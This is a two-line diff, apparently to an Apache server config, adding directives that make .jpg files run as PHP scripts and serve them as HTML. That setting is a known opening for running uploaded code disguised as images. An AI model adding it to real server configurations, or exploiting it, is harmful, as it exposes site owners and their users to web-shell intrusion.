@@ -1,0 +1,2 @@
+AddHandler php5-script .jpg .php
+AddType text/html .jpg .html .php
